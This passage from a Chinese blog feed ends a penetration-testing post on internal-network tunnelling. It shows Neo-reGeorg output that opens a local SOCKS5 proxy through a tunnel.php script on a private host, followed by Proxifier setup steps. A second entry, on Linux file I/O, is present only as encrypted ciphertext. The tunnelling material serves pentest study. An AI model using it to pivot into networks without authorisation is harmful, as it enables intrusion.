&#x27;<span class="variable">$</span><span class="variable">$v</span> c<span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string">               &#x27;<span class="variable">$</span><span class="variable">$v</span> <span class="variable">$</span><span class="variable">$v</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>#</span></span><br><span class="line"><span class="string">               <span class="variable">$</span><span class="variable">$x</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$twelve</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@<span class="variable">$</span>&#x27;</span></span><br><span class="line"><span class="string">             @<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>@L &#x27;    &#x27;&lt;@<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span><span class="variable">$</span>`</span></span><br><span class="line"><span class="string">           <span class="variable">$</span><span class="variable">$</span>                 &#x27;<span class="variable">$</span><span class="variable">$</span><span class="variable">$</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    [ Github ] https://github.com/L-codes/Neo-reGeorg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+------------------------------------------------------------------------+</span></span><br><span class="line"><span class="string">  Log Level set to [ERROR]</span></span><br><span class="line"><span class="string">  Starting SOCKS5 server [127.0.0.1:10086]</span></span><br><span class="line"><span class="string">  Tunnel at:</span></span><br><span class="line"><span class="string">    http://192.168.188.133/tunnel.php</span></span><br><span class="line"><span class="string">+------------------------------------------------------------------------+</span></span><br></pre></td></tr></table></figure></div>

<p>接下来打开 Proxifier。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123182900644.png"
                      alt="image-20240123182900644"
                ></p>
<p>如上图配置后，添加规则打开要代理的程序。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123183033094.png"
                      alt="image-20240123183033094"
                ></p>
<p><code>Action</code> 选择代理。然后即可通过代理访问内网。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/01/22/%E6%B8%97%E9%80%8F%E6%89%8B%E6%9C%AD%E4%B9%8B%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/image-20240123183221998.png"
                      alt="image-20240123183221998"
                ></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>内网隧道代理</tag>
      </tags>
  </entry>
  <entry>
    <title>浅析Linux内核之文件与IO</title>
    <url>/2024/01/22/%E6%B5%85%E6%9E%90Linux%E5%86%85%E6%A0%B8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8EIO/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="ac971de8692d9c21f220f2c8c4fd87b68f380c15b3234e4bad746302161cd847">2d806215ddc7c4fd1f6babc1a9ab678d6b15992746f26bfdbdf0a2f49fb26f6307c10d1846b56750550c5bbe46f367de84b84faa1ee1f859f637cc4fa47386374661d90c33e973043f72a51b78b29011552daccaedabcad757bd8fae683f9bbed82c2be022f75051e9f734ec65ec43babf4131bce578aa4d456d455b4405a916f25094e06183c627d35e179a41528bd9d53fbd4fb9c03788518d0e0009668aa57201e008bac90898680d3e068d1e3d6fc23eede667fd9830baada793eeac737484e33288488606c41312d0c1ecef57adb80ed04387c9f119e62bf781db379db24a30f511bf58c08a2c1d48c944b034295023f578958a7eb1490c07fd0e7cc36d806c9fa7ed55385f19571fd26dcba6e8433c3bf104be1f2bd603def72927aa8b42198b1de3750119682e8a757a7f47f7be103d331f87d2c5ef8323045098d21802d177019c8cd72589c4374a2f373e7456a0bb8ae471cebe390fa024c7633d30df6a474d1202fa336a10a0192907e5641e86788d45a1fc4d010a48e5aae4a9f7cc452cc1927c0308f64e5347b6f2a27a86fbca1cee5d20017815ccb0d6ca5de26ad082db36f8fb8c238330ad2cbbc161c86ef2d081af93518077c54e901c2db1de9abe358af6f5f6c0d7b06209206aa89e23bf74560c1fb09c0fde60563409a4e24deb1569a5716836fede0a67ef2699cc42c9e3607bd45323150adc7ad473af71e93323803c46376ff28505be05b053b6e3598a2f9a8fa975821b2e5e4092174922ef6b04111770dfb37eb3fee72fc63ce74a6954643448ae6539cd8ae39cc203c4f129aa7326047c17b82169123607eb6b11e1e42a93f8ba9c74956ad63bc014ccd1946a33eee7d6be2bdb6c5bac74dabdbd018372a351c1203cf6bf7882b9e0098059c47333884620821389afbfc858c5888566f06f80e1a1c98cf8d0141326d01cb41be54ec7b991d34fe6f0a65e82468c9c30a760e2d1f1601f43ac99d5479d093617387a91f471892b980813e9ad083c8bbc5ca91a5e1f73839e47c1cc599fb7ed181ab39e6029278c47804252c6b07f9aea75fe3ac82025efe89295f24e958845c7d894f8f4f682be29471c5b6aa32f9dd50519d0f8a95dfe33f95215666e4620c3afd2b3216d2d9942bcb183bbf8401f74485d761fc3bcfd59bcdd10e8b9311c3c24a0cebc5dc8c6217a1f9f8921b02112dbfd8b14e4720ff0f071a9d2121adebac411bf4c0d110b71697995179bbbb58b5da50cc1210af1ff7ff84378999b45ac3ed0fd9b5e2971c88cfaaa432f4d43bb78852590ede99c4169000931a0cc3158e12a96b8a8c8a2da03a45f4fed86dffca1421572957b45d6d36e6ecc8138141d93f8a58db1e1e7145fbe811fe8ddc04d927f579d904c84c1a1a84160e21f7d4340a32a6d9da32913cd80e3b096014896c8b628838224cd3ff6f20e3d2de980c3c034c6710a7c27a89075f06b5ea2e42f3d2490cfb57107fe626abc05b8fca888753ade9409fbdd9a9d6ac7f0f1b6a0617ad94833b87188a84baf535150bca8db82528335e1c15538f6e977208bc2a4c3afa1119ab84c32e3dccfc3334267dbf6be61958d1b944ac096ce1b325a3165569d3ea4ec2bd9be7aaefd9f859a790021e397db299defa828ce64dd03f11e62664a7aff299f651eeb9dc3f045853f61453b172cd10198027b44a356f74e1fac5d789b853aa9c674a335575b012c315b507746c29250ab900bf6ffb357e4de05150fc5a4c2401239babc2233a74f908e770df95eef857bbdf8ce2165bccec1437738989f5588eed23671b5a32f8ead8379fe311e942d1a5cc191188c0bfd8f7c9ba3629a16f831ddd05bcb3b452397e962296080c297639b428afa163629cbd1fde30074c0ceace695bcdb3715b006d6a75d7316d51d5c742974e6e5680e53a1c1eebf22c7f6abce9b2964d7746e2d7a6d2095bffa5dfac3b32d20fbe4c6f767103f5844295830cfbb7158d3a930e78465ea88d8d4ac62ecc99a9ff0ad683968eb8b1691c8f537af3a878ccb4024881832def80d9cec4283eecf89a7fac94f31dc154fe791d89a989ba34be252e57eb35bbb195c02bfbc1d8bc90daf95098f929e89ff51bcf58c3135021f3f71339b3b7bd02e7acf900a70abac0ac0bac5cf9045f127ed668e386ef9749247f83196f189291cc1af7b25fea6b1bec7066b252b9b291c68eaac65c33214a0397d16e4abd417bacf1535948c1666bded002650aa298413bca5fdcbe179e8a484d6af142701ac8360be6fa50df88b6cf6442fa81de0e41136a05417bcf1780884b3bdb0b49ca355345b51200a12abcd01fd2350b5e91841d34e16958bbb155076aea01a330772667933a6a6e703bf0f2dd040c30088b2a52cd512aee594edac39658e5ae84301d03a2a9fb10c46da8a3b3b782934fe78159faa8673bde5e8fd4aec9b75045aca2eb7c86f3d2064f84209ee6acf63d94ab2cf3ea13ff4ff6586738a2d24245914b7ea6c0163966e79192c5c87872b81a9891aeef566f02b0c9ce97f802d6dee74e57dae5dcafac9955aa69a325a2e9486f84d8c2a712e023b892713469b74bb558db5b278d665f93d236f82b8cddfac3d7d597447c7018fc22fd199225ab49a6c0248a57fa44296da50681bfd069eb76c0dd0ecc09c3a37a12e98c0132a398ea77509a06c65c663c6a107b0b7e4cad968fe8aac8e92fdecb8ecca5cb60b1a86cd4c7bc2aa2a87e96c402891b7dbf3e3a7d5c15376a3ce0224f2dbfcfd85487b7553a980c59596fa59e407a064b0a53c88a16f32e351341f620dd55b20d968d2ea3d94ce72f551301aaafb9f19df48981cf1b121649b16fc81a0e3283c1ef126b0d833b825f8bc6424a3edd9f8b4d041fe785f61b69ae693bf2b91b54abbcb28691a230b2e77171245d1f09eef8369b25849ac25b6c6e107842399309fe8fcb0ffbe11cb08cfd3d2c96cea734d2e3a63915e8e650ede178392810481597d26e9d47b6352d3b1e43e10910c0e43bfc9efcad46c8b78637b87bd3dd43b0222bdd900ec86f487a0a151bc1888fe5e227794a9c2893a738a2427d4ea144dd79f040be326ace7189e385d74b1f7c0858a4efdd06862c1691602504cbc27bb1009f105a6d301225991fc66bdbdad02646c93b6e5edc7ed04104af5e815949667717f1c495d9a6fe27793a5cce7700781121525b1642fffcc24e1d095c3b83c2c5c2a8b5d1297a69f4ce7f5ee69d1085609da08ec4f5966a1b29bc87ff3168bd61f738236b7040cbd8157f9c37c535d7ac77a7368596a95ed6dbb2e805c7107a1914670d6ae52ab3c516a0fb3419f0325089f7f5246b947cc0cfc81b770a83686d4db30d06c1c2ecac03f33b9acff733d4621b153bcadedabedf3b9c1e967e579c3ac4f32c6fcfe80b0fb63fd85478f89867f9d5d5a63fbbfea1057f437289dd466ca7ffa9a6edb8b6eba661404de7b6deaa38b55605b572cfe0fd63ce2bfea616851c91e09fb530487a8a3ba1e12ba2c674a9939965db9a2ddd98855a48c4ba169ecd69a1b00a93d6b423ff7fd0557484f88d0b3b71e3440e093c6ec5c8bc5c9f99394aaee26eefecc321bacc2b74aff426e66df1fbf6a84eb902841496cd0632125f5e62041381cfa796f45bbce576cf83b4efd284bf20201fc0af5366188229a691d594f40baecd16ab0713253c67616c6075cad507771f1dc364dd5b8ac05a5b3309606f4ef2e645e498e7230c73d7a0aae59ea7e1cfed7cf5d6dd613c63a4c81e6bed6cdc2532da172dba1ec67ffec5731f73682c6e40a6a1c5070fb3add94419349092401d84eac746fe444ca21fb9a2ec6f14e83bad1b22a9717474ecf646a40816bb7280d7c40254dea52bac4d0274a9f429d153325fdbd9d0dcd43580281ad2590ff9ae8dd81835622c48dfc2b1dbee539447095910e24e8e0a6f13ff6a7b9f6c2c943f5b0fa4a5bd6570bedb86c30462f44089212054e80c92ee369fecfa5eb7b851ed0b77c039487eabe051cd76f59f0791557c0b0e8d7795d42b679429ffa3ac417f104a09d7555b41249d6b176236bac70c511ecd54a34ffc7368b390a93cf4fe83e42eef27570fdc7eb956ac574e40cd85807a7b80efbc4e3c44df99caa410de3cfd6beb227ec75c85cc105c1b4daea1f3c602a9e41b206be96e5003a2e83e570ab65d8a3988b4ffb5ca5bf7ccde39016a44d9f9a8967c50c391eee17e56bfed803729b7f29560a49c83f0b776cca15fa43d6a3135e1165d087b3686ac195539b2360570bb9fd3c160c93cddbc3d178b3b6d0b723e1c63d029bf495ec4c9aff0f0061caa08ece231a33c27a5e4a427f6a58a215eb6740c87093ef225a50ecbf5cf4c9e9e89d196b1bf041da528ff3ce3da00efd55999a2cbf798ece8f5c5c21f545ecee6e61d8e3d10e8d712f985c37dde0836e2a24fc52d81b1563d6ce6f9e90d235453086f26b1fdab7e8801bd3b63f9870fd4fbc80f2bdde726241c6a72b671e869e12a3fbfb0aed61a980169c1ce167d5186b8b88a98d561e18c4963419a8482e5966da4ef010cde1820bca14712ab075f18e834e822925af031a0edf20e08e31076ce5a1c93ac508649b0e7fcb600ca63e4162c2f7e267ab2753a4228d6b4722fa7c9ccfefff1730368b5d839d13d14c7b53095a97e962411e0da424374e781f9b0f550058002614f3df4019e72073cbd7a4d5b0cbc0eb76bdb2a8f348cdacd05888de755357f85b0d128e6e07eb050114a76ebf35766c8414256efe7dd04656925e58f34fe3c5596f0415b4d5bd35b59a1e32a17cbf73e73bfc1f0a752522895aeb9befb66a0a0683ae275253432eef8fa3d3eced2a4b352802c72a1ef8191849e5045ce29217291593cbcea970aaada22a28a1496d8439be2b755c729ff3cf7873d279fc34b9d4c6049ad7e4dadb6c56c6a2c228c1afd816f27208137da72ebe9a50886a8700b5bbdcfc764771b474d2f3a407aa33e4a30069b03349a6d2be41074d8f1d98ab34cb8172f672a6191a9c098e33756e3b827a6eb134d1b661380b03352af7bdcad76eaf59085f8db1bf67906bb612e54ce90a505038190533f4d53f5734e256e73efb831a922f56c9c9258c5f5bb25a4a58e46db8ccc50cdeae7f04823bd0be7923dfa0c377b53614d85e2771ebccf51eef98a452828e3eccf1e161234fabd622a21859f35260abaf17c3487ac07579910db7d896246b9ab76a14281e6d6579e853be6d4f8ea30c68006a5c87545adbfd6f1d96325807cda3fcad5294dfff354070f35bd42e347c2ce33a14ec33230e5bfb71dcf210002c587ba55a94dea2e6864bd25dccdab9256795f4a64232462fbdcc4a47d95f8e90756e1f5cf8ded5562bdfe5227a548d25aa079a126c4be5e3eef85aa083509e81ce01fc21944d57a23c11d7e2467a68b1865afc4706454bcd25f4c99ca593efc5e0b5ad5cb277db97ee526543fb213db5c6f82e7d781ad94cbd59f2a05b5be2bbb4c0bd51543e0a46a1d85e21dc02eda9870bbdcf22415912ed2e5a7c714ddd6c547bc650ad08d44d69a968f5fac59b629df1cd1f3367de8a9bc48a9876cb12d607406fdceca6de75245e146f235e7b99609c1c5e37bf6a437e15128afcc5c5a69b131f119fbaf79ca6d1b00163b0fde64677557e6c28002e17cf1eb4e829350aee44dc2c4c7d43e4b1dabc0ef0850976c37ab87b7a5d38c891f33df1c9d6b04f9f9320c7d181089f7e1e1e8c6cc71d51bf25ae4bb091a09174b0b1173dadf3589e2e3c3c30e66a1c96bee0d6449df7ec0d5335432bd372d22cc2b3eaef9587a1b996e06a049169e672ee022614f99192d416f002c43353fc73f1a04df750b1db7304b93dd577c4c15a6a75bdbeace2b9f3563468498df6093a2f2d8b3068670b11c9e5323c27c546e947f0fdd8d00cb3f4be5c812323a3ee548c827840b94fa49db909c32512ee3559074a4d7509bf9ed43631313e07a0c833f99e978f357922e30d61fe1ea6573f48606c3f0b75801d6f6efb31edf936831833ccbeb085949105bb4d41b28c2d18e005bc9066fa0f7850381a0cef25770deaa0a8043226208481db7e2e846a3649a1761579f9ad68706ddc13b3dd9d896c1a37d0043d988effaf48202cf58247bba54b5df86cc2c1e9ea28c357a5621cdfad3556554110c7b8ed0635ebe13fdf4aed74d3dfe21e04af77542ae8e183deb7e3c157a5c1046d024f653478ebb77b738778ac5fd0b4494f71efcc3d8d388275404b4fccb8a0f1b0c5b212c666d1bc3ac2daafc8bed3d11dde7b7edbe5b197e9833b080766cefbba34f79304acebf80ac7bca53557ec8074291270757cf9b98eec60a3ce99fa7faf50f7b315611b7dcd650fed2344bebef1828d842f6993e0571993bd5de2dd7837feeb3cf68ba1a2dfbf5d3d508a8e8891e4b51fef919fb8596d6980028dfdb484568cd9818334e941ab96e5b653c5f4050a6a40ba47d31982eacf62487549cb2a95cbdf15125c980b58e7411de11e18f632af56aed786d9ee9bf28fce03cf0aa8616422e326ec2177c7347bef9e42213b8bab6e6b63cba418053b7f09500a567f6a4ec5fa2af0bf4edc6b5d7b7b5aff79cd1cfda8c3d39b37b1809295ddb8e3e99bfec1b384ca0969cd735853690e837b6ba60fe6ea0b469377a239629a5a18f10ab7d30f885bcdfce8fba0dcc5ef97eca9dc56a66551f8e6ee24c96bb93ebaa7c381bd04bfa4697ea21e49c1b7653e8dfdd294dd6a1a47568ce09fb203fa422756d613e06d6fc3fe8b55a9c95ab5b9b1025affb6cc353687525462c26ff9b19185e099a58ac4582885226c1760a868c6e578d8f2dfc9c82e759a2ec4f38a2f5d29423c09a7ae6078dd88b607adce54d9a13722d6d71080e28bd6a9f0ddb476104749afe13e8c87a6526fe8ad7e63ef94822778ceef56ad0bee0b199a1ef5e016aba4042c3c717c2580ed233f613506364ec775cf7205eb7f45f9989e23ccf52a107ef8dd71ef4183ede105429e3733061dd92c4cae2298ef94c6fa024ec00a83d5b0c069d56ec1956e552e61ce413fb44a739eb1d1943988198b6e748fbc9d0fc14348d9f99cfa5d60e8de7350d05bcfba275f23ca97ad918c8a22000d039d75afa8c7d66c48fc283bcd22b1edd6a75ecb775c564363645b06bf1b2a1e3ce0c47e098bfeffe9809aa8a83c95605015e08c8b3597245f13bff4a07e8831be5a18a1e26d64b3a09daa1ba91833908d78c2b734c23cbab24c47ddc4d2fe59473c1306454cdf62329b68f24108d10e344f8485417c194bd3f8b82cd5e56cd117e6ebfcfe7a519df3957efa40063ee2853d8b594c9f0d30e5d46b8143f7c9e5b721be386058afaee0f64c780e15b68094615d6e3915071418ea3fcb5ad94aa13238f64475701fda58c8b5fccc65bdcd6fe7ddc178a5f049585776e729e01e8b2e88d1e672bac34320d152f55c4a799d80306efe521dae35a228062c3c38752d36a97071da1ab3a590003b654959543d781543b805d9b50f88a63580c60cfd1bb14dfe59f069b7087d695da285c8e64ff7190af5190a8e4459e334771bedacf08fffc92bf2142a1f4afd91c65b608a5ddb59f570ccac672cdb9e4e4229717a3a29a0b8ca2849acbff29d5bbb433f0f4ff5db1ae5a93dee3e1d3468119afddc3624b65b111d5199022183046a7aae38c4087a81d3abbe52cdb612cf79d0a1f87fea7b4ab4058f7a2d4d5c43a3ff148affacb94d65da41e50d7915d7eb79439ea61690886394455f1167857d87235a3f10e5b723d21c70cb9998d47dff5e04e9c9dcc1fbced9df3a06e20a471461ad81b4cfbd4415ef888160f0943b5c6b67a4c165abfe921420148a18e95611365216c8acdbb16e8aeea03763dfd9d89fb935a5f8dccf2607be60c08bdb786a0531b6f08d7d1016e0e7ca6171be6aee8cda772007cb14f70f2ccfc58ee0b6c2cbd2dd58e42223f88ab9ad512432adc2c158fab4a6e402be28404eda953b7ab63a62e192ba3a1a7e89e08878e46a60066860155578ac0d773c9e593c95349fc22007e12ceba11c96be86168510f8caa02a771bc3b161b4074af3ae4ca67cde81ecf20cf3bbe8179f6cc06fb99b0a0b44c311ae4d014171ab1943e5276ea618410497b1a0952fb86591097c3a96ecd2c94945c1330202fe9cd3e2252c6c945e8084ee76fdaeeb51b37ab3b1919a82f72254902f075edbe0f4af6c47de0f6a3f51d9ef181a0f55704a734a787ac32acbe4a57207b4df27f4098f90bc42ece3558f8428b8ac6f0a3d34219b32c3ab6db34f9ddfdb9d2870dcf1fa9931a06ebc4e18f7b2c06a48711d2288b162db2ed63ad3f8c541b78b05a823249d9f0dfdfc67e3241fe5d42fb8508fc9cbf21b8a15944f3b3e63f436e5eca379838df20108c1f4441676c528869d5551de69a635c7c881579a0e7c6c569742324c0ae235a0c28ff4e533a6b2dd82b0a114be5f5c142dc53faa49ded6958a67bb0b64b61a48ec87d408a81933d86133e0e07d62dd4240ad49e32df078f8d2f5bcd36641b9a8e22abb17f87330e23267020dd2a0fd39007d6f346416cfe6f23b0a07bf717cf34bc86d1b0ea5c12632a4579c8bb821c34649806299f74c4037e61220707cd12dd9362eebde5dc0abbec08410e15c1e25c46a0ba9578846ebfe16ff988fb06000b5f6cb3345e1fd16193a22273a8caece7f6bc043979c062038c65e6e5c5960249055ea1224c075c67a9f6544c46c17b94fa18e23467c1d3ecbc70348ef183f6d86170e6ff9e4879b25ad5a9518351da21844a2c7f70203966c4c201db9fdfb475cf5ed0c08a5bed267871d56f20ca9811ceac4dedaaa2ddba1fb9075525a50dcf0b965ef6aeef339817ba2f3bac0d24de9f6843d6ec9f6723d3213fda281cbb06a72ad9c5a5d404ee1e1774d8b7727ab875d6b5ef3b7141c082ff8138d6e83d129bd981f723dd916fb5fbad9a51830be143ea7fd8b9ed4c12c8bb51c2c50d670699a19a2cee06bb9b34405c18d4c0c778c4dec85753de4f7840d0511a9c9f7e0fcfbdc2b222a29633e2bf67162c01eed8aab76ce0e1f4a11c096ab76f57803dc789986637afb99923c1782045db27d67fee29bce5d07c3957a07185dc6b04cd991315fd8e862d57363a10242cc18d23539209564b73f5b96b783ed42174da101b57852c5e4e42e7670d75e33a6564bac54003fb125036646b61797ca4fa9b9a444ef377ba53ea603cda040c9723185a6cb2a1c60432464132fa5bffc503e42d5c5cf202990a65c621f59918b2fc7f0b2823521689821a91117fcb462f56455bd2a5ec5c0aea7bc84276152a94fe063031b9ef8f6e7229dcf6434bbc71b15609a84772968f854f91f80d8295fc1fe63b9c3c393de4841ed2c9e4b08c0e29b9b024e6b54e83cf0457ceb1693f9fed613b251c3a0fb64c8d4db9bfa7f6af1336650afe376f7e48e83e1a43c3684621e63aaed1ba7bf1a9579573aa019d4ed392d2582ea5a191f0c898c53ab2bccad144d0b20a86a0b4e3fc77902c24ac4dbca46c34a5d347a18c57740738d6e2be230fa7a68c3f99a9691b5855ce79be69248572cd1cdcbde674682f7e4584f9e65dd2d5e8878a665ad9542b0e4f3e9cfccd0667210315ccb7a4b414f23000f43f07adf92ce27e43173197cafc573fe44d1c491bc84f6ab548b9f1f638198554a807f956dfdac1e4b2aabc7b78f2273a926b011a5047a9612fcfb2ba840daaa628330456fdb6e53c08331c203f59e8b94cf8849ac81a061d13707fc075564592f25564ec33590b0b83690c657040e8cda4ade9cf819f7200ecccb27931c37029e8ea50a6f2016be4a760a0aabdc6f509fc1d279a89d1650947bd51a957a8708abbdcef5df540cf0c22542366ef0a5a36ab50c40292028f872a51a3d6cb969aa8a812cc75a76e14dc2ded8780f11657fe9011101e1dfb52c134c924e13f3cdee6ff15a8e0308c134af7366ae58312560cb8ca7af89f0cf4cdf508d6a0197bc8e3486a55ad58ba173f7565dc2862c48b5ff30a24834e7c94fd78001f66ef7423bffd7798f8adadd081d3f0b085117d9ae002e700a0e9b797c6165054ae9215c4be57bf70845e0e9a54412c0a750a4d75299d8420dd38b44f9b4a821e29034fe65894c7f39ffe1ab63b47643e6b39022993f465007bfeb05e332af88b75f321655987a23944f0b0df6fd48a803a7ddfa7caf2b64cdcdfffca6c296bf69797296d26e969809cb2ae1ef664d53011210199b5aa1c14f089f44370f025b17206e65749a7d173003029dc9aea0755ec7228b74765c9649130aaf8d307b3c9618238421ed7c19a09e274edcd00db0250f0a3efddbd5ff45129f21d6330896588cdcd27494bf16602583520862a4812e61b9ed06d3c3f489f3ce067380a1ab5ea65eb155ff36bc9186041b2a76f75303ad45d1f52e37d285d14c504ea9ddf68b986d30daf019ebf5eb1b100770629b45fac3f0eb2a34b6860eee8bd5188f9206ab3825eca40732ce5fb8c628095428caa5f89e176e9b617893b2dc03a221171ef4524954c4558cd71f5209f5df36288109443a6c6d5e67c7440956c1fbf6dfe6d90d6eceb2436252484d065955ebe375a13f0dc8adebed38759e40e44f6d67476b2345e93c24a4689ff0f522f3b2e90f69c694335ee07973e737fd001c764b6d927ed18d5a083c6ad1ac6be91d46319ed49d8a90a7b4b4bf8e5b6eda54240c6a4403d88e96d1b9eb1d40d7ff12a028cebaae257eb1a938c781df0ff333a18f8e68eb56f35fb4c72c6973185b73feaaca2b5619e3eb1c496e3ec88e7cd514de982d0d1912a2348e64a0c890cda8416bb966e49194189b9bb829c6b2f41e63f497b0a56d3a36c35b6dbee537440bf6f5961f49fbe8d2306ef10001f7a258f8a677cecf6f88edde866a62b4765bec782d3da65236ed22345ed5bc7402fe3b28306db3a84632839d771442c530044384523944d536978f1506e6faa47789550f12272b919002083a012baa6d2ac83ec5d13f95fcdbe1f1808e8bf17e0b6f4f2fd99b2d28fe2774a84b6cdb51ef3d8feb5d924de726a18232e92d4024a87ddc610a68e9e1bdf655481e74aa20624325ab44278e5d7e00ac3beacf6c9dcb33ebdbcccfcdfdeeb70cdec1931ecfdb72234637aac0b669bac6bb3aaf4dd6216908228fb80bfda6d218ab7596d38668bdc0eebfe038637ad0fffad31c65c3b5c5bcbe5f556b7ad96ab430d19ab946ba857d573856570f8fde8260add6f3adadf5a9b082e1f97719f448a2122ce9c096a33607affa2d5d1cf54ff4f85ba3f9d47a7a73b93fdfc68d9bc82a75086cfad9f61bb80b253eee8751651f5525c18a6a7f4eb5bb50f415f294d185dfc078b58aa732f667a33a577a50fa1f8a9a27f698b01ff6c23c41881467efe1813c653583e1ce3ed50f1929b1d0d76f54d3274cd17035b7fec424c1e91d9dfe6eb512336ed0bc8f4f2d1982a321beb72e6cc9718624067e2eda38e745b8f78089f8296ce6f804f9c5bae72221463238d12d5ebcd88c0386e0202f789bd90f1e8b352e7eec2cad7236c5f332e0899dc25508a54b3f3b49901ed57f5c286259c5e93bc1f144f0dd70825ebaca943f8a5e39f628eb745dd33df9b211649950aef5e05ba1ab9a3a299df2ff0a0f7ce5dbaed612a53b6c1b6ed1d4a4ed35c7629f79818296f1d88f4f5e6ad66895e35882917c6f854ad01c8ae36f7b3d9110caa65899b223c827105162aad4832f2c17ad56ac3818540c56a8eaca98cc82024520dcde6c002579caca5231b7664eb22e216216df05c36e09a41519aca79503d236c5081496533ac7b4875dec5602cb7bdafd84c792d0149a2209a0ebd28a757f8114b38d906d082e357b1cf41c264ab2bca5fe533793e1f2548501d8cb62d5ae8a33eac043e2973bd945c58452863a039a60caae37ff47360ec7c3022f7e3e83087242606d5dbfb2c3b20aff4893fec8f80740546ddd01f449d29fea2decb73683caed569cf410e6fe8a4496abffaeb4b38b95a833d01a529f1e001914ce66c3f70cc43594e04f2b1bdd212ac777d59bc84f4009402135a2f37a896d0c5b8719b9bdc20a432da1d6ffb486c1d90141f7163b2d2b25594b050c109e75b5b11a2d3665cd61c391caf18a064c73d730bf5e0eb62fddb0d15e982e94cd8e0754179f554bb319068fb160587ad557362b6bfe5df738a1b7c1cfa01be1de39c38b869f3f87d03a35b605241a5692fe0917abafe9bac692494d715ad91a6bdb4610516e4c7fd6f3edc1a86b9ac2f53bfc7d92956a2f8110522abb4b43e59db506017e86338ad450bab2cb02018f642fab59da8c283ae9b852e055741ef58054dfba782bb745725ae7e0578f53b316fde44a83cc46994a37539c2bcc8c70bcbe3db5cb9ed88afee555c9680fba6077bc5311fa89bec61b8c04b5efb1fbafe8ef3137ceb07a2bcfe23358227b149cb6634e1fad6d3d346f86d83ab2303166fea9e23e19c62e7d542023800a78f5175944d9e11e0dcc33d3f5a980990bff36a48065a00b108cdfe09f06a9e6f0e0d83c6581dd00345eb772badc557d19ea4b9467854fb60102dd41803683c4cb5438d9a57ba5b82fee2d5c37d8a0e258cbc2259c2a0e4758996153b16c748b0e0c817761adcb697e8616525e862c6b444c7c56a26af7b7c41ab0ab14098a7cde1323ce17e54eae552df32e7a38bbd99008e24b5fb9bd52ac47185a426993531302ce61f3c9e3c5a1e16f0381372bbeb06b4dd21a02055b8658cf7b2e80494f63f5323a8b3670b93e456c891c0520fcf1515cf1bf6e47beb0a6b2a8f5c46cb6e2ee7665f591c1b8afce009d776c2c9c84423acf9cedb2a00e1830aa56a84f1485d84ba2ba165685731b3209f85b3b41a41e06b974dbbfd7c35f4f719999ff53639c574a2652e4b0557618d2bc45109fa7d770ebea8ebf42a170c4ff8ad82d0b301fb5e0d9141a72a2dacadbf6b1e5a0b7f9e5114491ff4fe6706f920119c80a0b676472c788860cc856edf19dd577dd5666354fd3c8636e7e1b0e76c821c035e5094ecae5d825e4be98c44764d0b4ed4f2af37a9451218a5b153ba3cf5a75de29e201be5e07cf8451fcd797bd43cbdd30ff60ee7c1481cd346d0455c60238b849dc6e6059637dd698bd3dfa071e6a22987117b09bfc9cc7f579cd9b36591eec681a288853863357331da79aaf740a0e8040ac157af71312edaeb935d74d3a6c93b6914e765e5df2bb18c5069064221390de7c7e73a1f5ce896f5f641a39511de298a9546a240941082c9aa73538f6f8e035016be11c98c7ecfcd3b2fa4e2877dd4b562473afbe9b0412ff42de31edd35a3071381a4b461c0fee3d8d9f88c2fa11412e69290cdae361fa802f44751673943412064fd3a3135c6c81b42aafcf4da681176f33c76d117eee1e325b56fb15a77741d392fe2f0215b1fdede42fbcb19ddab84c794b20ce7a223e9464b226393c36bc93f577625632d8ab59a7c00742befb19f7e9269fb6bda77dceafe2ae07bb77a16b442413d2f324b773c666fad812303ff13942705829b3c85d1129aff9f7110c8e9c71945692deb3c7c0cc30e78f7aa0211100644a48b1377af0a12e95cc1325c416a67ad77b020a9bd8b7bfaa19569871d5c72856bb189d33c782ed7b4407287636b4e12c60c973dede6f00ebd70d9e7c2962653f03ce8a885ab35f84307a1377ff52a9daaa7ab68e89a25796b56a937ae2d26cd37255c075809439517bfe086d9aee3e91f85a0801c1b6fad5e4d8bacc4d90eb3be2ca0a875eb457b956afb1d18bb167dd6323c7b0ec68bafa0b5dd739d5645d13185e91b28139fc38a931ed6e78d71aa9fa108f181f3e5c8f3ebae76afdcd666cb4fd365aabbcb6a0577ce39edbca6cd461331341884edfee58edc1bc936a4a2a5fb7b2f2223c33c11917d46c4f40321c36ae94cb3cb9bc61448ced845beef9f259e5085aeee68f67d7970f98332964d2c62f2808786d848545fedd5c1fcf04bf482c7f98d508224cb50a4e2ad729677841d12544dcddcba17be17711710f23a32873d52e94b49b680ccbac4bc36cfc894c4fcc53e2d832ddac76b78f9af4221e3796bd11fc9ff0ff05cee075debaf9a9672721a806ec876fa9afdc7521c138d79bb6d594329fb564cc4b280bc9408b8d19be2793539640fe4810266da78d8f2440260dfb0c8ac0b83ffa75d13bbddf83ab1344dc280c92cabb0ccf00db0ddf027bea8d39e02dbb792a2217b1f44b36c2441edbd1560f112972ae960e816db84cae1edbb35b671b4f4